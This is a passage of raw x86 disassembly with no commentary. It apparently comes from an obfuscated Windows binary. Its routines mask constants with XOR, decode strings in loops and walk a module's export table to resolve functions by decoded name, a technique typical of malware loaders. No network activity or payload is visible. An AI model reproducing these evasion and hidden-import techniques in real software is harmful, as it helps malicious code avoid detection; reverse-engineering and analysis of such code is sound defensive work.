  422391:	mov    ebx,0x4e3c
  422396:	cmp    cx,bx
  422399:	jne    0x422363
  42239b:	cmp    DWORD PTR [ebp-0x4],0xf89c85b6
  4223a2:	pop    edi
  4223a3:	pop    ebx
  4223a4:	je     0x4223ab
  4223a6:	xor    eax,eax
  4223a8:	inc    eax
  4223a9:	jmp    0x4223ad
  4223ab:	xor    eax,eax
  4223ad:	pop    esi
  4223ae:	leave  
  4223af:	ret    
  4223b0:	push   ebp
  4223b1:	mov    ebp,esp
  4223b3:	push   ecx
  4223b4:	mov    eax,DWORD PTR [ebp+0x8]
  4223b7:	movzx  ecx,WORD PTR [eax]
  4223ba:	push   esi
  4223bb:	lea    eax,[ecx-0x3b5f]
  4223c1:	mov    esi,0x8a9d
  4223c6:	push   edi
  4223c7:	xor    eax,esi
  4223c9:	mov    edi,0x4e3c
  4223ce:	mov    DWORD PTR [ebp-0x4],edx
  4223d1:	cmp    ax,di
  4223d4:	je     0x422401
  4223d6:	mov    eax,DWORD PTR [ebp+0x8]
  4223d9:	sub    eax,edx
  4223db:	mov    DWORD PTR [ebp+0x8],eax
  4223de:	jmp    0x4223e3
  4223e0:	mov    eax,DWORD PTR [ebp+0x8]
  4223e3:	mov    WORD PTR [edx],cx
  4223e6:	add    edx,0x2
  4223e9:	movzx  edi,WORD PTR [eax+edx*1]
  4223ed:	mov    ecx,edi
  4223ef:	add    edi,0xffffc4a1
  4223f5:	xor    edi,esi
  4223f7:	mov    eax,0x4e3c
  4223fc:	cmp    di,ax
  4223ff:	jne    0x4223e0
  422401:	xor    eax,eax
  422403:	pop    edi
  422404:	mov    WORD PTR [edx],ax
  422407:	mov    eax,DWORD PTR [ebp-0x4]
  42240a:	pop    esi
  42240b:	leave  
  42240c:	ret    0x4
  42240f:	push   ebp
  422410:	mov    ebp,esp
  422412:	sub    esp,0x18
  422415:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  42241c:	mov    DWORD PTR [ebp-0x18],0xf89c85b4
  422423:	mov    ecx,DWORD PTR [ebp-0x8]
  422426:	push   esi
  422427:	mov    eax,0x75108b3
  42242c:	xor    ecx,eax
  42242e:	mov    esi,0x3272fa
  422433:	add    ecx,esi
  422435:	mov    DWORD PTR [ebp-0x4],ecx
  422438:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  42243f:	mov    DWORD PTR [ebp-0x10],0xf89c85b9
  422446:	push   edi
  422447:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  42244e:	jmp    0x4224ef
  422453:	mov    ecx,DWORD PTR [ebp-0x4]
  422456:	mov    edx,DWORD PTR [ebp+0x10]
  422459:	sub    edx,ecx
  42245b:	mov    ecx,DWORD PTR [ebp-0xc]
  42245e:	xor    ecx,eax
  422460:	add    ecx,esi
  422462:	cmp    edx,ecx
  422464:	jbe    0x422481
  422466:	mov    edx,DWORD PTR [ebp-0x4]
  422469:	add    edx,DWORD PTR [ebp+0x8]
  42246c:	mov    ecx,DWORD PTR [ebp-0x4]
  42246f:	add    ecx,DWORD PTR [ebp+0xc]
  422472:	mov    edi,DWORD PTR [ecx]
  422474:	mov    DWORD PTR [edx],edi
  422476:	mov    ecx,DWORD PTR [ecx+0x4]
  422479:	mov    DWORD PTR [edx+0x4],ecx
  42247c:	mov    ecx,DWORD PTR [ebp-0xc]
  42247f:	jmp    0x4224ce
  422481:	mov    ecx,DWORD PTR [ebp-0x4]
  422484:	mov    edx,DWORD PTR [ebp+0x10]
  422487:	sub    edx,ecx
  422489:	mov    ecx,DWORD PTR [ebp-0x10]
  42248c:	xor    ecx,eax
  42248e:	add    ecx,esi
  422490:	cmp    edx,ecx
  422492:	mov    ecx,DWORD PTR [ebp-0x4]
  422495:	jbe    0x4224a9
  422497:	add    ecx,DWORD PTR [ebp+0x8]
  42249a:	mov    edx,DWORD PTR [ebp-0x4]
  42249d:	add    edx,DWORD PTR [ebp+0xc]
  4224a0:	mov    edx,DWORD PTR [edx]
  4224a2:	mov    DWORD PTR [ecx],edx
  4224a4:	mov    ecx,DWORD PTR [ebp-0x10]
  4224a7:	jmp    0x4224ce
  4224a9:	mov    edx,DWORD PTR [ebp+0x10]
  4224ac:	sub    edx,ecx
  4224ae:	mov    ecx,DWORD PTR [ebp-0x14]
  4224b1:	xor    ecx,eax
  4224b3:	add    ecx,esi
  4224b5:	cmp    edx,ecx
  4224b7:	mov    ecx,DWORD PTR [ebp-0x4]
  4224ba:	jbe    0x4224df
  4224bc:	add    ecx,DWORD PTR [ebp+0x8]
  4224bf:	mov    edx,DWORD PTR [ebp-0x4]
  4224c2:	add    edx,DWORD PTR [ebp+0xc]
  4224c5:	mov    dx,WORD PTR [edx]
  4224c8:	mov    WORD PTR [ecx],dx
  4224cb:	mov    ecx,DWORD PTR [ebp-0x14]
  4224ce:	mov    edx,DWORD PTR [ebp-0x4]
  4224d1:	xor    ecx,eax
  4224d3:	lea    ecx,[ecx+edx*1+0x3272fa]
  4224da:	mov    DWORD PTR [ebp-0x4],ecx
  4224dd:	jmp    0x4224ef
  4224df:	add    ecx,DWORD PTR [ebp+0x8]
  4224e2:	mov    edx,DWORD PTR [ebp-0x4]
  4224e5:	add    edx,DWORD PTR [ebp+0xc]
  4224e8:	mov    dl,BYTE PTR [edx]
  4224ea:	mov    BYTE PTR [ecx],dl
  4224ec:	inc    DWORD PTR [ebp-0x4]
  4224ef:	mov    ecx,DWORD PTR [ebp-0x18]
  4224f2:	mov    edx,DWORD PTR [ebp+0x10]
  4224f5:	xor    ecx,eax
  4224f7:	add    ecx,esi
  4224f9:	imul   ecx,edx
  4224fc:	mov    edx,DWORD PTR [ebp-0x8]
  4224ff:	mov    edi,DWORD PTR [ebp-0x4]
  422502:	xor    edx,eax
  422504:	lea    edx,[edx+edi*1+0x3272fa]
  42250b:	cmp    edx,ecx
  42250d:	jb     0x422453
  422513:	pop    edi
  422514:	pop    esi
  422515:	leave  
  422516:	ret    0xc
  422519:	push   ebp
  42251a:	mov    ebp,esp
  42251c:	sub    esp,0xc
  42251f:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  422526:	push   esi
  422527:	mov    esi,eax
  422529:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  422530:	mov    edx,DWORD PTR [ebp-0x4]
  422533:	mov    eax,0x75108b3
  422538:	xor    edx,eax
  42253a:	mov    ecx,0x3272fa
  42253f:	add    edx,ecx
  422541:	cmp    esi,edx
  422543:	je     0x422585
  422545:	push   ebx
  422546:	push   edi
  422547:	mov    edx,DWORD PTR [ebp-0x8]
  42254a:	mov    ebx,DWORD PTR [ebp+0x8]
  42254d:	xor    edx,eax
  42254f:	mov    edi,0xffcd8d06
  422554:	sub    edi,edx
  422556:	add    esi,edi
  422558:	lea    edx,[esi-0x3272fa]
  42255e:	xor    edx,eax
  422560:	mov    DWORD PTR [ebp-0xc],edx
  422563:	mov    edx,DWORD PTR [ebp-0x4]
  422566:	mov    edi,DWORD PTR [ebp-0xc]
  422569:	xor    dl,0xb3
  42256c:	sub    dl,0x6
  42256f:	xor    edi,eax
  422571:	mov    BYTE PTR [edi+ebx*1+0x3272fa],dl
  422578:	mov    edx,DWORD PTR [ebp-0x4]
  42257b:	xor    edx,eax
  42257d:	add    edx,ecx
  42257f:	cmp    esi,edx
  422581:	jne    0x422547
  422583:	pop    edi
  422584:	pop    ebx
  422585:	pop    esi
  422586:	leave  
  422587:	ret    0x4
  42258a:	push   ebp
  42258b:	mov    ebp,esp
  42258d:	sub    esp,0x21c
  422593:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  42259a:	mov    DWORD PTR [ebp-0x14],0xf89c85b4
  4225a1:	mov    eax,DWORD PTR [ebp+0x10]
  4225a4:	mov    eax,DWORD PTR [ebp-0x4]
  4225a7:	mov    ecx,DWORD PTR [ebp+0x8]
  4225aa:	push   esi
  4225ab:	push   edi
  4225ac:	mov    edi,0x75108b3
  4225b1:	xor    eax,edi
  4225b3:	mov    esi,0x3272fa
  4225b8:	add    eax,esi
  4225ba:	cmp    eax,ecx
  4225bc:	mov    eax,DWORD PTR [ebp-0x4]
  4225bf:	jne    0x4225ca
  4225c1:	xor    eax,edi
  4225c3:	add    eax,esi
  4225c5:	jmp    0x422676
  4225ca:	mov    ecx,DWORD PTR [ebp+0xc]
  4225cd:	xor    eax,edi
  4225cf:	add    eax,esi
  4225d1:	cmp    eax,ecx
  4225d3:	jne    0x4225da
  4225d5:	mov    eax,DWORD PTR [ebp-0x4]
  4225d8:	jmp    0x4225c1
  4225da:	lea    eax,[ebp-0x21c]
  4225e0:	mov    DWORD PTR [ebp-0x8],eax
  4225e3:	mov    eax,DWORD PTR [ebp+0xc]
  4225e6:	mov    DWORD PTR [ebp-0x10],eax
  4225e9:	mov    eax,DWORD PTR [ebp-0x4]
  4225ec:	xor    eax,edi
  4225ee:	add    eax,esi
  4225f0:	mov    DWORD PTR [ebp+0x10],eax
  4225f3:	mov    eax,DWORD PTR [ebp+0xc]
  4225f6:	push   ebx
  4225f7:	call   0x422321
  4225fc:	mov    ebx,eax
  4225fe:	mov    eax,DWORD PTR [ebp+0x8]
  422601:	mov    eax,DWORD PTR [eax+0x14]
  422604:	jmp    0x42265e
  422606:	mov    eax,DWORD PTR [ebp+0xc]
  422609:	sub    eax,0x8
  42260c:	mov    DWORD PTR [ebp-0xc],eax
  42260f:	mov    eax,DWORD PTR [ebp-0xc]
  422612:	mov    eax,DWORD PTR [eax+0x28]
  422615:	call   0x422209
  42261a:	mov    DWORD PTR [ebp+0x10],eax
  42261d:	push   DWORD PTR [ebp+0x10]
  422620:	mov    edx,DWORD PTR [ebp-0x8]
  422623:	call   0x4223b0
  422628:	mov    eax,DWORD PTR [ebp-0x4]
  42262b:	xor    eax,edi
  42262d:	add    eax,esi
  42262f:	cmp    eax,ebx
  422631:	jne    0x42263b
  422633:	mov    eax,DWORD PTR [ebp-0x8]
  422636:	call   0x422297
  42263b:	mov    eax,DWORD PTR [ebp-0x14]
  42263e:	xor    eax,edi
  422640:	add    eax,esi
  422642:	push   eax
  422643:	push   DWORD PTR [ebp-0x10]
  422646:	mov    eax,DWORD PTR [ebp-0x8]
  422649:	call   0x421fc3
  42264e:	mov    ecx,DWORD PTR [ebp-0x4]
  422651:	xor    ecx,edi
  422653:	add    ecx,esi
  422655:	cmp    eax,ecx
  422657:	je     0x42267c
  422659:	mov    eax,DWORD PTR [ebp+0xc]
  42265c:	mov    eax,DWORD PTR [eax]
  42265e:	mov    DWORD PTR [ebp+0xc],eax
  422661:	mov    eax,DWORD PTR [ebp+0x8]
  422664:	mov    ecx,DWORD PTR [ebp+0xc]
  422667:	add    eax,0x14
  42266a:	cmp    ecx,eax
  42266c:	jne    0x422606
  42266e:	mov    eax,DWORD PTR [ebp-0x4]
  422671:	xor    eax,edi
  422673:	add    eax,esi
  422675:	pop    ebx
  422676:	pop    edi
  422677:	pop    esi
  422678:	leave  
  422679:	ret    0xc
  42267c:	mov    eax,DWORD PTR [ebp-0xc]
  42267f:	mov    eax,DWORD PTR [eax+0x18]
  422682:	jmp    0x422675
  422684:	push   ebp
  422685:	mov    ebp,esp
  422687:	mov    eax,DWORD PTR [ebp+0xc]
  42268a:	sub    esp,0x10
  42268d:	cmp    DWORD PTR [ebp+0x8],0x0
  422691:	push   ebx
  422692:	push   esi
  422693:	push   edi
  422694:	je     0x422749
  42269a:	test   eax,eax
  42269c:	je     0x422749
  4226a2:	movzx  eax,WORD PTR [eax+0x20]
  4226a6:	mov    ecx,eax
  4226a8:	mov    DWORD PTR [ebp-0x10],eax
  4226ab:	xor    edx,edx
  4226ad:	and    DWORD PTR [ebp-0x8],edx
  4226b0:	mov    eax,0x8a9d
  4226b5:	xor    ecx,eax
  4226b7:	add    ecx,0x3b5f
  4226bd:	mov    DWORD PTR [ebp-0xc],ecx
  4226c0:	and    DWORD PTR [ebp-0x4],0x0
  4226c4:	xor    ecx,ecx
  4226c6:	push   0x7d
  4226c8:	pop    edi
  4226c9:	cmp    cx,WORD PTR [ebp-0xc]
  4226cd:	jae    0x422733
  4226cf:	lea    esi,[edx-0x3b5f]
  4226d5:	xor    esi,eax
  4226d7:	movzx  ecx,WORD PTR [ebp-0x4]
  4226db:	mov    ebx,DWORD PTR [ebp+0xc]
  4226de:	lea    ecx,[ebx+ecx*4]
  4226e1:	cmp    WORD PTR [ecx+0x2],si
  4226e5:	jne    0x42271e
  4226e7:	movzx  ecx,WORD PTR [ecx]
  4226ea:	mov    edi,0x4e3c
  4226ef:	cmp    cx,di
  4226f2:	jne    0x422700
  4226f4:	mov    ebx,DWORD PTR [ebp+0x8]
  4226f7:	movzx  edi,dx
  4226fa:	cmp    BYTE PTR [edi+ebx*1],0x0
  4226fe:	je     0x42272d
  422700:	mov    ebx,DWORD PTR [ebp+0x8]
  422703:	movzx  edi,dx
  422706:	movsx  di,BYTE PTR [edi+ebx*1]
  42270b:	mov    ebx,0x3b5f
  422710:	sub    di,bx
  422713:	xor    di,ax
  422716:	cmp    cx,di
  422719:	je     0x42272d
  42271b:	push   0x7b
  42271d:	pop    edi
  42271e:	inc    DWORD PTR [ebp-0x4]
  422721:	mov    cx,WORD PTR [ebp-0xc]
  422725:	cmp    WORD PTR [ebp-0x4],cx
  422729:	jb     0x4226d7
  42272b:	jmp    0x422733
  42272d:	inc    DWORD PTR [ebp-0x8]
  422730:	push   0x7a
  422732:	pop    edi
  422733:	mov    esi,DWORD PTR [ebp+0x8]
  422736:	movzx  ecx,dx
  422739:	cmp    BYTE PTR [ecx+esi*1],0x0
  42273d:	je     0x422752
  42273f:	inc    edx
  422740:	cmp    edi,0x7b
  422743:	jne    0x4226c0
  422749:	xor    eax,eax
  42274b:	pop    edi
  42274c:	pop    esi
  42274d:	pop    ebx
  42274e:	leave  
  42274f:	ret    0x8
  422752:	mov    ecx,DWORD PTR [ebp-0x8]
  422755:	add    ecx,0xffffc4a1
  42275b:	xor    cx,ax
  42275e:	xor    eax,eax
  422760:	cmp    cx,WORD PTR [ebp-0x10]
  422764:	sete   al
  422767:	jmp    0x42274b
  422769:	push   ebp
  42276a:	mov    ebp,esp
  42276c:	sub    esp,0x50
  42276f:	push   edi
  422770:	mov    edi,eax
  422772:	mov    eax,DWORD PTR [edi+0x1a8]
  422778:	cmp    DWORD PTR [eax],0x0
  42277b:	jne    0x422784
  42277d:	xor    eax,eax
  42277f:	jmp    0x4228b5
  422784:	push   DWORD PTR [ebp+0x8]
  422787:	push   0x2c
  422789:	pop    eax
  42278a:	call   0x422519
  42278f:	mov    edx,DWORD PTR [edi+0x1ac]
  422795:	lea    eax,[edi+0x22]
  422798:	mov    DWORD PTR [ebp-0x4c],eax
  42279b:	lea    eax,[edi+0x44]
  42279e:	mov    DWORD PTR [ebp-0x48],eax
  4227a1:	lea    eax,[edi+0x66]
  4227a4:	mov    DWORD PTR [ebp-0x44],eax
  4227a7:	lea    eax,[edi+0x88]
  4227ad:	mov    DWORD PTR [ebp-0x40],eax
  4227b0:	lea    eax,[edi+0xaa]
  4227b6:	mov    DWORD PTR [ebp-0x3c],eax
  4227b9:	lea    eax,[edi+0xcc]
  4227bf:	mov    DWORD PTR [ebp-0x38],eax
  4227c2:	lea    eax,[edi+0xee]
  4227c8:	mov    DWORD PTR [ebp-0x34],eax
  4227cb:	lea    eax,[edi+0x110]
  4227d1:	mov    DWORD PTR [ebp-0x30],eax
  4227d4:	lea    eax,[edi+0x132]
  4227da:	mov    DWORD PTR [ebp-0x2c],eax
  4227dd:	lea    eax,[edi+0x154]
  4227e3:	push   edi
  4227e4:	mov    DWORD PTR [ebp-0x50],edi
  4227e7:	mov    DWORD PTR [ebp-0x28],eax
  4227ea:	call   0x4228e9
  4227ef:	push   eax
  4227f0:	mov    eax,DWORD PTR [edi+0x1a8]
  4227f6:	push   DWORD PTR [eax]
  4227f8:	call   0x42258a
  4227fd:	mov    DWORD PTR [ebp-0x10],eax
  422800:	test   eax,eax
  422802:	je     0x4228b5
  422808:	mov    ecx,DWORD PTR [eax+0x3c]
  42280b:	push   ebx
  42280c:	push   esi
  42280d:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  422811:	add    esi,eax
  422813:	mov    edi,DWORD PTR [esi+0x24]
  422816:	mov    ecx,DWORD PTR [esi+0x1c]
  422819:	mov    edx,DWORD PTR [esi+0x20]
  42281c:	mov    ebx,DWORD PTR [esi+0x18]
  42281f:	add    edi,eax
  422821:	mov    DWORD PTR [ebp-0x20],edi
  422824:	mov    edi,DWORD PTR [esi+0x14]
  422827:	add    ecx,eax
  422829:	add    edx,eax
  42282b:	mov    DWORD PTR [ebp-0xc],ecx
  42282e:	mov    DWORD PTR [ebp-0x1c],edx
  422831:	mov    DWORD PTR [ebp-0x8],edi
  422834:	cmp    edi,ebx
  422836:	ja     0x42283b
  422838:	mov    DWORD PTR [ebp-0x8],ebx
  42283b:	xor    ebx,ebx
  42283d:	mov    DWORD PTR [ebp-0x18],ebx
  422840:	cmp    DWORD PTR [ebp-0x8],ebx
  422843:	jbe    0x4228b3
  422845:	jmp    0x42284a
  422847:	mov    edx,DWORD PTR [ebp-0x1c]
  42284a:	mov    edi,DWORD PTR [ebp-0x20]
  42284d:	movzx  edi,WORD PTR [edi+ebx*2]
  422851:	cmp    ebx,DWORD PTR [esi+0x18]
  422854:	jae    0x4228b3
  422856:	cmp    edi,DWORD PTR [esi+0x14]
  422859:	jae    0x4228b3
  42285b:	mov    ebx,DWORD PTR [edx+ebx*4]
  42285e:	mov    edx,DWORD PTR [ebp+0x8]
  422861:	mov    edi,DWORD PTR [ecx+edi*4]
  422864:	mov    DWORD PTR [ebp-0x4],edx
  422867:	lea    edx,[ebp-0x50]
  42286a:	add    ebx,eax
  42286c:	add    edi,eax
  42286e:	sub    edx,DWORD PTR [ebp+0x8]
  422871:	mov    DWORD PTR [ebp-0x14],0xb
  422878:	mov    DWORD PTR [ebp-0x24],edx
  42287b:	mov    edx,DWORD PTR [ebp-0x4]
  42287e:	cmp    DWORD PTR [edx],0x0
  422881:	jne    0x42289e
  422883:	mov    eax,DWORD PTR [ebp-0x24]
  422886:	push   DWORD PTR [eax+edx*1]
  422889:	push   ebx
  42288a:	call   0x422684
  42288f:	mov    ecx,DWORD PTR [ebp-0xc]
  422892:	test   eax,eax
  422894:	je     0x42289b
  422896:	mov    eax,DWORD PTR [ebp-0x4]
  422899:	mov    DWORD PTR [eax],edi
  42289b:	mov    eax,DWORD PTR [ebp-0x10]
  42289e:	add    DWORD PTR [ebp-0x4],0x4
  4228a2:	dec    DWORD PTR [ebp-0x14]
  4228a5:	jne    0x42287b
  4228a7:	mov    ebx,DWORD PTR [ebp-0x18]
  4228aa:	inc    ebx
  4228ab:	mov    DWORD PTR [ebp-0x18],ebx
  4228ae:	cmp    ebx,DWORD PTR [ebp-0x8]
  4228b1:	jb     0x422847
  4228b3:	pop    esi
  4228b4:	pop    ebx
  4228b5:	pop    edi
  4228b6:	leave  
  4228b7:	ret    0x4
  4228ba:	push   ebp
  4228bb:	mov    ebp,esp
  4228bd:	mov    eax,DWORD PTR [ebp+0x8]
  4228c0:	push   esi
  4228c1:	push   DWORD PTR [eax+0x1e0]
  4228c7:	lea    esi,[eax+0x198]
  4228cd:	mov    eax,DWORD PTR [ebp+0x8]
  4228d0:	call   0x422769
  4228d5:	mov    ecx,DWORD PTR [esi]
  4228d7:	mov    DWORD PTR [ecx],eax
  4228d9:	mov    eax,DWORD PTR [esi]
  4228db:	xor    ecx,ecx
  4228dd:	cmp    DWORD PTR [eax],ecx
  4228df:	pop    esi
  4228e0:	setne  cl
  4228e3:	mov    eax,ecx
  4228e5:	pop    ebp
  4228e6:	ret    0x4
  4228e9:	mov    ecx,DWORD PTR [edi+0x188]
  4228ef:	push   ebx
  4228f0:	jmp    0x422905
  4228f2:	xor    eax,0x8a9d
  4228f7:	add    eax,0x3b5f
  4228fc:	mov    WORD PTR [ecx],ax
  4228ff:	add    ecx,0x2
  422902:	add    edx,0x2
  422905:	movzx  eax,WORD PTR [edx]
  422908:	mov    ebx,0x4e3c
  42290d:	cmp    ax,bx
  422910:	jne    0x4228f2
  422912:	xor    eax,eax
  422914:	mov    WORD PTR [ecx],ax
  422917:	mov    eax,DWORD PTR [edi+0x188]
  42291d:	pop    ebx
  42291e:	ret    
  42291f:	push   edi
  422920:	mov    edi,eax
  422922:	mov    eax,DWORD PTR [esi+0x188]
  422928:	shl    edi,0x6
  42292b:	add    eax,edi
  42292d:	jmp    0x422939
  42292f:	xor    cl,0x81
  422932:	add    cl,0x6
  422935:	mov    BYTE PTR [eax],cl
  422937:	inc    eax
  422938:	inc    edx
  422939:	mov    cl,BYTE PTR [edx]
  42293b:	cmp    cl,0x7b
  42293e:	jne    0x42292f
  422940:	mov    BYTE PTR [eax],0x0
  422943:	mov    eax,DWORD PTR [esi+0x188]
  422949:	add    eax,edi
  42294b:	pop    edi
  42294c:	ret    
  42294d:	push   ebp
  42294e:	mov    ebp,esp
  422950:	sub    esp,0x14
  422953:	mov    DWORD PTR [ebp-0x10],0xf89c85b5
  42295a:	mov    DWORD PTR [ebp-0x4],0xf89c85b4
  422961:	mov    eax,DWORD PTR [ebx]
  422963:	mov    DWORD PTR [ebp-0x8],eax
  422966:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  42296d:	push   esi
  42296e:	push   edi
  42296f:	mov    DWORD PTR [ebp-0x14],0xead71895
  422976:	mov    edi,DWORD PTR [ebp-0x4]
  422979:	mov    ecx,DWORD PTR [ebp-0x10]
  42297c:	mov    eax,0x75108b3
  422981:	xor    edi,eax
  422983:	mov    edx,0x3272fa
  422988:	xor    ecx,eax
  42298a:	add    edi,edx
  42298c:	add    ecx,edx
  42298e:	imul   edi,ecx
  422991:	jmp    0x4229d9
  422993:	mov    ecx,DWORD PTR [ebp-0x8]
  422996:	mov    esi,DWORD PTR [ebp-0x4]
  422999:	xor    ecx,eax
  42299b:	xor    esi,eax
  42299d:	add    ecx,edx
  42299f:	add    esi,edx
  4229a1:	test   esi,ecx
  4229a3:	mov    esi,DWORD PTR [ebp-0x8]
  4229a6:	mov    ecx,DWORD PTR [ebp-0x4]
  4229a9:	je     0x4229c0
  4229ab:	xor    ecx,eax
  4229ad:	xor    esi,eax
  4229af:	add    ecx,edx
  4229b1:	add    esi,edx
  4229b3:	shr    esi,cl
  4229b5:	mov    ecx,DWORD PTR [ebp-0x14]
  4229b8:	xor    ecx,eax
  4229ba:	add    ecx,edx
  4229bc:	xor    esi,ecx
  4229be:	jmp    0x4229ca
  4229c0:	xor    esi,eax
  4229c2:	xor    ecx,eax
  4229c4:	add    esi,edx
  4229c6:	add    ecx,edx
  4229c8:	shr    esi,cl
  4229ca:	mov    DWORD PTR [ebp-0x8],esi
  4229cd:	mov    ecx,DWORD PTR [ebp-0x4]
  4229d0:	xor    ecx,eax
  4229d2:	lea    edi,[edi+ecx*1+0x3272fa]
  4229d9:	mov    ecx,DWORD PTR [ebp-0xc]
  4229dc:	mov    esi,DWORD PTR [ebp-0x4]
  4229df:	xor    esi,eax
  4229e1:	xor    ecx,eax
  4229e3:	sub    ecx,esi
  4229e5:	cmp    edi,ecx
  4229e7:	jbe    0x422993
  4229e9:	mov    eax,DWORD PTR [ebp-0x8]
  4229ec:	pop    edi
  4229ed:	mov    DWORD PTR [ebx],eax
  4229ef:	mov    eax,DWORD PTR [ebp-0x8]
  4229f2:	pop    esi
  4229f3:	leave  
  4229f4:	ret    
  4229f5:	push   ebp
  4229f6:	mov    ebp,esp
  4229f8:	sub    esp,0x38
  4229fb:	push   ebx
  4229fc:	mov    ebx,0xf89c85b5
  422a01:	mov    DWORD PTR [ebp-0x4],ebx
  422a04:	lea    ecx,[ebx-0x1]
  422a07:	mov    DWORD PTR [ebp-0x24],ecx
  422a0a:	mov    eax,DWORD PTR [ebp-0x4]
  422a0d:	mov    edx,DWORD PTR [ebp+0x8]
  422a10:	push   esi
  422a11:	mov    esi,0x75108b3
  422a16:	xor    eax,esi
  422a18:	push   edi
  422a19:	mov    edi,0x3272fa
  422a1e:	add    eax,edi
  422a20:	cmp    edx,eax
  422a22:	mov    eax,DWORD PTR [ebp-0x4]
  422a25:	je     0x422b8a
  422a2b:	mov    edx,DWORD PTR [ebp+0xc]
  422a2e:	xor    eax,esi
  422a30:	add    eax,edi
  422a32:	cmp    edx,eax
  422a34:	je     0x422b87
  422a3a:	mov    eax,DWORD PTR [ebp+0x10]
  422a3d:	mov    edx,DWORD PTR [ebp+0xc]
  422a40:	mov    DWORD PTR [ebp-0x14],eax
  422a43:	mov    eax,DWORD PTR [ebp+0x8]
  422a46:	mov    DWORD PTR [ebp-0x18],0xf89c8522
  422a4d:	mov    DWORD PTR [ebp-0xc],eax
  422a50:	lea    eax,[ebx+0x6]
  422a53:	mov    DWORD PTR [ebp-0x1c],eax
  422a56:	mov    DWORD PTR [ebp-0x10],ebx
  422a59:	mov    DWORD PTR [ebp+0xc],ecx
  422a5c:	mov    DWORD PTR [ebp+0x10],eax
  422a5f:	mov    eax,DWORD PTR [ebp+0xc]
  422a62:	xor    eax,esi
  422a64:	mov    DWORD PTR [ebp-0x20],edx
  422a67:	sub    edx,eax
  422a69:	sub    edx,edi
  422a6b:	mov    DWORD PTR [ebp+0x8],edx
  422a6e:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  422a75:	jmp    0x422b77
  422a7a:	mov    eax,DWORD PTR [ebp+0xc]
  422a7d:	mov    ecx,DWORD PTR [ebp+0xc]
  422a80:	xor    eax,esi
  422a82:	xor    ecx,esi
  422a84:	lea    ecx,[eax+ecx*1+0x64e5f4]
  422a8b:	mov    eax,DWORD PTR [ebp+0x8]
  422a8e:	xor    edx,edx
  422a90:	div    ecx
  422a92:	mov    eax,DWORD PTR [ebp+0x10]
  422a95:	mov    ecx,DWORD PTR [ebp+0xc]
  422a98:	xor    eax,esi
  422a9a:	xor    ecx,esi
  422a9c:	sub    eax,ecx
  422a9e:	cmp    edx,eax
  422aa0:	jne    0x422b36
  422aa6:	mov    eax,DWORD PTR [ebp+0x8]
  422aa9:	mov    ecx,DWORD PTR [ebp-0xc]
  422aac:	mov    dl,BYTE PTR [eax+ecx*1]
  422aaf:	mov    eax,DWORD PTR [ebp-0x10]
  422ab2:	mov    ecx,DWORD PTR [ebp-0x8]
  422ab5:	xor    eax,esi
  422ab7:	xor    ecx,esi
  422ab9:	add    eax,edi
  422abb:	add    ecx,edi
  422abd:	cmp    eax,ecx
  422abf:	jae    0x422b07
  422ac1:	lea    ecx,[eax-0x3272fa]
  422ac7:	mov    DWORD PTR [ebp-0x4],ecx
  422aca:	mov    ebx,DWORD PTR [ebp-0x4]
  422acd:	xor    ebx,esi
  422acf:	add    ebx,0x7f55d8fb
  422ad5:	lea    ecx,[ebp+eax*4-0x38]
  422ad9:	mov    DWORD PTR [ecx],ebx
  422adb:	mov    ebx,DWORD PTR [ecx]
  422add:	cmp    ebx,0x244ecb9a
  422ae3:	jbe    0x422aed
  422ae5:	add    DWORD PTR [ecx],0x405fcd9
  422aeb:	jmp    0x422af3
  422aed:	add    DWORD PTR [ecx],0xfdaf4327
  422af3:	mov    ecx,DWORD PTR [ebp-0x8]
  422af6:	xor    ecx,esi
  422af8:	inc    eax
  422af9:	inc    DWORD PTR [ebp-0x4]
  422afc:	add    ecx,edi
  422afe:	cmp    eax,ecx
  422b00:	jb     0x422aca
  422b02:	mov    ebx,0xf89c85b5
  422b07:	cmp    DWORD PTR [ebp-0x14],0x0
  422b0b:	jne    0x422b15
  422b0d:	xor    dl,0x81
  422b10:	add    dl,0x6
  422b13:	jmp    0x422b2b
  422b15:	mov    eax,DWORD PTR [ebp-0x18]
  422b18:	xor    al,0xb3
  422b1a:	mov    cl,0x6
  422b1c:	sub    cl,al
  422b1e:	add    dl,cl
  422b20:	mov    ecx,DWORD PTR [ebp-0x1c]
  422b23:	xor    cl,0xb3
  422b26:	sub    cl,0x6
  422b29:	ror    dl,cl
  422b2b:	xor    eax,eax
  422b2d:	mov    eax,DWORD PTR [ebp+0x8]
  422b30:	mov    ecx,DWORD PTR [ebp-0xc]
  422b33:	mov    BYTE PTR [eax+ecx*1],dl
  422b36:	mov    eax,DWORD PTR [ebp+0x8]
  422b39:	mov    ecx,DWORD PTR [ebp-0x10]
  422b3c:	sub    eax,edi
  422b3e:	xor    eax,esi
  422b40:	cmp    eax,ecx
  422b42:	jne    0x422b65
  422b44:	mov    eax,DWORD PTR [ebp+0x10]
  422b47:	mov    ecx,DWORD PTR [ebp+0xc]
  422b4a:	xor    eax,esi
  422b4c:	xor    ecx,esi
  422b4e:	sub    eax,ecx
  422b50:	mov    ecx,DWORD PTR [ebp-0x20]
  422b53:	sub    eax,edi
  422b55:	xor    eax,esi
  422b57:	mov    DWORD PTR [ebp+0x10],eax
  422b5a:	mov    eax,DWORD PTR [ebp+0xc]
  422b5d:	xor    eax,esi
  422b5f:	sub    ecx,eax
  422b61:	sub    ecx,edi
  422b63:	jmp    0x422b74
  422b65:	mov    eax,DWORD PTR [ebp+0xc]
  422b68:	xor    eax,esi
  422b6a:	mov    ecx,0xffcd8d06
  422b6f:	sub    ecx,eax
  422b71:	add    ecx,DWORD PTR [ebp+0x8]
  422b74:	mov    DWORD PTR [ebp+0x8],ecx
  422b77:	mov    eax,DWORD PTR [ebp+0x10]
  422b7a:	cmp    eax,ebx
  422b7c:	jne    0x422a7a
  422b82:	mov    eax,DWORD PTR [ebp-0x24]
  422b85:	jmp    0x422b8a
  422b87:	mov    eax,DWORD PTR [ebp-0x4]
  422b8a:	xor    eax,esi
  422b8c:	add    eax,edi
  422b8e:	pop    edi
  422b8f:	pop    esi
  422b90:	pop    ebx
  422b91:	leave  
  422b92:	ret    0xc
  422b95:	push   ebp
